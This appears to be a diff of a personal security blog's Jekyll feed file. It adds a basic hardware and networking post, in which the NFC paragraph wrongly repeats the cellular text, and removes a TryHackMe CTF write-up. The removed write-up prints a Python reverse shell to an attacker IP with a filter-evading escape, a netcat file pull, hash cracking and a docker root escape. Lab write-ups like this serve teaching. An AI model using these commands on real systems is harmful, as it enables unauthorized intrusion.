@@ -1,7 +1,74 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-02-29T14:36:55+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Bug Bounty Methodology, Otorecon</title><link href="http://localhost:4000/bug-bounty-methodology-oto/" rel="alternate" type="text/html" title="Bug Bounty Methodology, Otorecon" /><published>2024-02-29T00:00:00+03:00</published><updated>2024-02-29T00:00:00+03:00</updated><id>http://localhost:4000/bug-bounty-methodology-oto</id><content type="html" xml:base="http://localhost:4000/bug-bounty-methodology-oto/"><![CDATA[<h1 align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-02-17T22:31:21+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Basics of Computer Technology and Networking</title><link href="http://localhost:4000/first-day-of-roadmapsh-challenge/" rel="alternate" type="text/html" title="Basics of Computer Technology and Networking" /><published>2025-02-15T00:00:00+03:00</published><updated>2025-02-15T00:00:00+03:00</updated><id>http://localhost:4000/first-day-of-roadmapsh-challenge</id><content type="html" xml:base="http://localhost:4000/first-day-of-roadmapsh-challenge/"><![CDATA[<p>Basics of Computer Technology and Networking</p>
+
+<p><br /></p>
+
+<h2 id="contents"><strong>Contents</strong></h2>
+<ul>
+  <li><a href="#computer-hardwares">Computer Hardwares</a></li>
+  <li><a href="#connection-types">Connection Types</a></li>
+</ul>
+
+<p><br />
+<br /></p>
+
+<h2 id="computer-hardwares"><strong>Computer Hardwares</strong></h2>
+
+<p>There are several different kinds of hardware inside a PC.</p>
+
+<p><img src="/assets/img/roadmapsh-challenge/ınternal_hardware.png" alt="Internal-Hardware" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Motherboard:</code></strong> The motherboard is like the skeleton of a computer. The motherboard connects all the other hardware together.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">CPU (Central Processing Unit):</code></strong> The CPU is like a brain. Human has a speed of thinking and the same thing is valid for CPU and it’s measured in GHz(Gigahertz).</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">RAM (Random Access Memory):</code></strong>  RAM is like a temporary CPU. RAM temporarily stores information and the stored data is erased each time. RAM has many important functions, including rendering images for graphic design, editing video or photos, and multitasking with multiple applications or programs open. How much RAM you need depends on the programs you’re running. It will change with new technologies. Today, 8GB of RAM is nothing. You need more than that.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">HDD (Hard Disk Drive) and SSD (Solid State Drive):</code></strong>  HDD and SSD are two different types of storage. HDDs are older technology and slower than SSDs. SSDs come out as the clear winner, primarily based on speed, durability, and power consumption.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">GPU (Graphics Processing Unit):</code></strong> GPUs process graphical data. A dedicated graphics card connects with the motherboard via an expansion slot, so you can upgrade your graphics card if you want to improve gaming, video, or visual performance from your PC. And some PC’s. Have different versions of CPUs and at that time CPUs does process graphical data.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">PSU (Power Supply Unit):</code></strong> A PSU takes electricity from an external power source or laptop battery and passes it to the motherboard to power individual hardware components. This makes it essential to use a power supply with suitable wattage.</p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="connection-types"><strong>Connection Types</strong></h2>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Ethernet:</code></strong> Ethernet is wired networking technology that allows devices to communicate within a Local Area Network (LAN). It was first developed in the 1970s by Xerox, Intel, and Digital Equipment Corporation (DEC). Ethernet’s biggest advantages are high speed, reliability, and security. Unlike wireless connections, it experiences less interference and fewer disruptions. The physical cabling also enhances security by preventing unauthorized access. However, its wired nature does come with some downsides, such as limited mobility and higher installation costs.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Wi-Fi (Wireless Fidelity):</code></strong> Wi-Fi, works by transmitting data over radio waves. Instead of using physical cables like Ethernet, Wi-Fi enables devices to send and receive information through the air. This is made possible by a router, which connects to the internet via a wired connection and then broadcasts a wireless signal that your devices can pick up.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Bluetooth:</code></strong>  Bluetooth is a wireless communication standard that enables data exchange over short distances. Operating on the 2.4 GHz ISM (Industrial, Scientific, and Medical Devices) band, it allows devices to communicate directly with each other.
+The advantages of Bluetooth include low power consumption, cost-effectiveness, and universal compatibility. However, due to its limited data transfer speed and range, it may not be suitable for applications requiring high bandwidth or long-distance connectivity.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Fiber-Optic Connections:</code></strong> Fiber-optic connections use light signals through glass or plastic fibers to transmit data at very high speeds over long distances, making them ideal for internet backbones or connecting data centers. Fiber is faster and more reliable than traditional copper cables, but it is also more expensive to implement.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Cellular Connections:</code></strong> Cellular connections are a type of wireless communication technology that enables devices to connect to a mobile network for voice calls, messaging, and internet access. These networks operate through a system of cell towers that transmit signals over radio frequencies, allowing seamless connectivity even while moving between locations.
+Cellular technology has evolved through multiple generations, from 1G (analog) to modern 5G, which offers ultra-fast speeds and low latency. The main advantages of cellular connections include wide coverage, mobility, and reliable internet access. However, factors like network congestion, signal interference, and data plan costs can affect performance.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">NFC (Near Field Communication):</code></strong> Cellular connections are a type of wireless communication technology that enables devices to connect to a mobile network for voice calls, messaging, and internet access. These networks operate through a system of cell towers that transmit signals over radio frequencies, allowing seamless connectivity even while moving between locations.
+Cellular technology has evolved through multiple generations, from 1G (analog) to modern 5G, which offers ultra-fast speeds and low latency. The main advantages of cellular connections include wide coverage, mobility, and reliable internet access. However, factors like network congestion, signal interference, and data plan costs can affect performance.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">(IR) Infrared:)</code></strong> IR is a wireless communication technology that uses infrared light to transmit data over short distances. It operates on the electromagnetic spectrum just beyond visible light and is commonly used in remote controls, short-range data transfer, and some sensing applications.</p>
+
+<p><br /></p>
+
+<p>:metal: :metal:  I hope you learned something and had fun. But that’s it for now till next time take care.  :wave:</p>
+
+<p><br />
+<br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Roadmapsh Challenge" /><category term="security," /><category term="cyber-security," /><category term="challange," /><summary type="html"><![CDATA[Basics of Computer Technology and Networking]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/basic_ct_n.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/basic_ct_n.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Bug Bounty Methodology, Otorecon</title><link href="http://localhost:4000/bug-bounty-methodology-oto/" rel="alternate" type="text/html" title="Bug Bounty Methodology, Otorecon" /><published>2024-02-29T00:00:00+03:00</published><updated>2024-02-29T00:00:00+03:00</updated><id>http://localhost:4000/bug-bounty-methodology-oto</id><content type="html" xml:base="http://localhost:4000/bug-bounty-methodology-oto/"><![CDATA[<p>Bug Bounty Methodology, Otorecon</p>
+
+<p><br />
+<br />
+<br /></p>
+
+<h1 align="center">
 <a href="https://github.com/Mr0Wido/otorecon"><img src="https://i.hizliresim.com/s1vb4eu.png" alt="otorecon" />
-	</a>
-	</h1>
+</a>
+</h1>
 
 <h1 id="otorecon"><a href="https://github.com/Mr0Wido/otorecon">OTORECON</a></h1>
 
@@ -131,6 +198,7 @@ You can run this command for <strong><code class="language-plaintext highlighter
 
 <p><br />
 <br /></p>
+
 <h3 id="filtering">Filtering</h3>
 
 <p>I use <a href="https://github.com/projectdiscovery/httpx">httpx</a> tool for filtering but if you want you can use <a href="https://github.com/tomnomnom/httprobe">httprobe</a> to.</p>
@@ -218,7 +286,7 @@ You can run this command for <strong><code class="language-plaintext highlighter
 <hr />
 
 <p><br />
-<br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="bug_bounty, bug_bounty-tools, otorecon" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/otorecon.png" /><media:content medium="image" url="http://localhost:4000/assets/img/otorecon.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Revenge</title><link href="http://localhost:4000/tryhackme-revenge/" rel="alternate" type="text/html" title="TryHackMe - Revenge" /><published>2023-07-10T00:00:00+03:00</published><updated>2023-07-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-revenge</id><content type="html" xml:base="http://localhost:4000/tryhackme-revenge/"><![CDATA[<p>You’ve been hired by Billy Joel to get revenge on Ducky Inc…the company that fired him. Can you break into the server and complete your mission?</p>
+<br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="bug_bounty, bug_bounty-tools, otorecon" /><summary type="html"><![CDATA[Bug Bounty Methodology, Otorecon]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/otorecon.png" /><media:content medium="image" url="http://localhost:4000/assets/img/otorecon.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Revenge</title><link href="http://localhost:4000/tryhackme-revenge/" rel="alternate" type="text/html" title="TryHackMe - Revenge" /><published>2023-07-10T00:00:00+03:00</published><updated>2023-07-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-revenge</id><content type="html" xml:base="http://localhost:4000/tryhackme-revenge/"><![CDATA[<p>You’ve been hired by Billy Joel to get revenge on Ducky Inc…the company that fired him. Can you break into the server and complete your mission?</p>
 
 <p>Created by <a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a></p>
 
@@ -1570,210 +1638,4 @@ $ read
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care :wave:</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, rce, cms" /><summary type="html"><![CDATA[Try to exploit our image gallery system.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gallery.png" /><media:content medium="image" url="http://localhost:4000/assets/img/gallery.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Chill Hack</title><link href="http://localhost:4000/tryhackme-chill-hack/" rel="alternate" type="text/html" title="TryHackMe - Chill Hack" /><published>2023-05-09T00:00:00+03:00</published><updated>2023-05-09T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-chill-hack</id><content type="html" xml:base="http://localhost:4000/tryhackme-chill-hack/"><![CDATA[<p>Easy level CTF.  Capture the flags and have fun!</p>
-
-<p><br /></p>
-
-<h2 id="1-user-flag">1. User Flag</h2>
-
-<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.249.219
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chill-hack/nmap.png" alt="nmap" /></p>
-
-<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">21/tcp FTP, 22/tcp SSH, 80/tcp HTTP</code></p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/ftp.png" alt="ftp" /></p>
-
-<p>It seems we can log in FTP server anonymously.
-And there is a file called <code class="language-plaintext highlighter-rouge">note.txt</code> on the server.</p>
-
-<p>Let’s take a look at what’s written inside <code class="language-plaintext highlighter-rouge">note.txt</code>.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/note.png" alt="note" /></p>
-
-<p><em><code class="language-plaintext highlighter-rouge">Anurodh told me that there is some filtering on strings being put in the command -- Apaar</code></em></p>
-
-<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/home.png" alt="home" /></p>
-
-<p>I’ve been browsing the site but nothing remarkable.</p>
-
-<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.249.219  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chill-hack/gobuster.png" alt="gobuster" /></p>
-
-<p>We found the <em><code class="language-plaintext highlighter-rouge">/secret</code></em> directory.</p>
-
-<p>Let’s look at this page.</p>
-
-<p>We found a page where we can run commands.</p>
-
-<p>I try to run a few commands but something like this comes up.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/alert.png" alt="alert" /></p>
-
-<p>I’m trying to do a reverse shell, but none of the codes I tried worked. Except this:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.86.168",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
-
-</code></pre></div></div>
-
-<p>I ran the code like <code class="language-plaintext highlighter-rouge">p\ython</code> instead of python. We are inside now.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/in.png" alt="in" /></p>
-
-<p>I found an interesting file in <code class="language-plaintext highlighter-rouge">/var/www</code>.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/ints.png" alt="ints" /></p>
-
-<p>Let’s look at the <code class="language-plaintext highlighter-rouge">/files</code> directory.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/files.png" alt="files" /></p>
-
-<p>What’s in these files? Let’s look.</p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">account.php</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/account.png" alt="account" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">hacker.php</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/hacker.png" alt="hacker" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">index.php</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/index.png" alt="index" /></p>
-
-<p>We found important things in the index.php file.</p>
-
-<p><code class="language-plaintext highlighter-rouge">Mysql - Database: webportal</code>, <code class="language-plaintext highlighter-rouge">root:*************</code></p>
-
-<p>Let’s see if we can log in to <code class="language-plaintext highlighter-rouge">MySQL</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mysql -u root -p 
-$ show databases;
-$ use webportal
-$ show tables;
-$ select * from users;
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chill-hack/mysql.png" alt="mysql" /></p>
-
-<p>We find the encrypted version of the passwords of Anurodh and Apaar.</p>
-
-<p>Let’s look at the type of passwords.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/id.png" alt="id" /></p>
-
-<p>It seems passwords are encoded using md5. Let’s crack these passwords.</p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Anurodh</code></strong>;</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/crack1.png" alt="crack1" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Apaar</code></strong>;</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/crack2.png" alt="crack2" /></p>
-
-<p>I try these passwords for ssh login. But it’s not working.</p>
-
-<p>So let’s back the <code class="language-plaintext highlighter-rouge">hacker.php</code>. Firstly, we must download the <code class="language-plaintext highlighter-rouge">hacker-with-laptop_23-2147985341.jpg</code> file.</p>
-
-<p>In my machine;</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/mine.png" alt="mine" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 &gt; hacker-with-laptop_23-2147985341.jpg
-</code></pre></div></div>
-
-<p>In target machine;</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/target.png" alt="target" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc my-ip 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg
-</code></pre></div></div>
-
-<p>We get the file. Now, need to use <code class="language-plaintext highlighter-rouge">steghide</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
-$ zip2john backup.zip &gt; hash.hash
-$ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chill-hack/steghide.png" alt="steghide" /></p>
-
-<p>Now that we’ve found the password, let’s see what’s inside the <code class="language-plaintext highlighter-rouge">backup.zip</code>.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/zip.png" alt="zip" /></p>
-
-<p>We found Anurodh’s password in <code class="language-plaintext highlighter-rouge">source_code.php</code>.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/encode.png" alt="encode" /></p>
-
-<p>Let’s decode.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/decode.png" alt="decode" /></p>
-
-<p>Now, we can access Anurodh’s ssh.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/ssh.png" alt="ssh" /></p>
-
-<p>I try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command and it works.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/sudol.png" alt="sudol" /></p>
-
-<p>We have a bash file for Apaar that we can run without requiring a password.</p>
-
-<p>Let’s see what’s in it.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/writein.png" alt="writein" /></p>
-
-<p>Let’s run the file and try adding <code class="language-plaintext highlighter-rouge">/bin/bash</code> to it.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/helpline.png" alt="helpline" /></p>
-
-<p>Yeah, it’s work. Now we can access Apaar.</p>
-
-<p>Let’s get the user flag.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/user-flag.png" alt="user-flag" /></p>
-
-<p><br /></p>
-
-<h3 id="2-root-flag">2. Root Flag</h3>
-
-<p>Now, we must return back to Anurodh.</p>
-
-<p>I found this and it’s interesting.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/docker.png" alt="docker" /></p>
-
-<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> to see if I can find anything about Docker.</p>
-
-<p>Let’s try this code.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/gtf.png" alt="gtf" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-</code></pre></div></div>
-
-<p>And we are root. Yes!</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/rootin.png" alt="rootin" /></p>
-
-<p>Let’s get the root flag.</p>
-
-<p><img src="/assets/img/tryhackme/chill-hack/root-flag.png" alt="root-flag" /></p>
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care :wave:</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="command-injection, sql-injection, real-world" /><summary type="html"><![CDATA[Easy level CTF. Capture the flags and have fun!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chill-hack.png" /><media:content medium="image" url="http://localhost:4000/assets/img/chill-hack.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, rce, cms" /><summary type="html"><![CDATA[Try to exploit our image gallery system.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gallery.png" /><media:content medium="image" url="http://localhost:4000/assets/img/gallery.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
